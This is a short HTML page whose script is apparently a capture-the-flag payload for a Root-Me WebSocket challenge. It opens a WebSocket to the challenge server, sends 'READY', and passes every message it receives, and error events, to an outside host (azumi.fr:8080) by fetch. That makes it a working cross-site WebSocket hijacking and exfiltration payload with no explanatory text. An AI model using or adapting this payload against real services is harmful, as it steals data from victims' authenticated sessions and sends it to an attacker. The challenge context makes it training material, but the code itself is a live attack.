<h1>Hello</h1>
<script>
  var ws = new WebSocket('ws://challenge01.root-me.org:58036/ws');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('http://azumi.fr:8080/'+event.data, {mode: 'no-cors'});
  };
  ws.onerror = function(event) {
    fetch('http://azumi.fr:8080/'+event.data, {mode: 'no-cors'});
  };
</script>
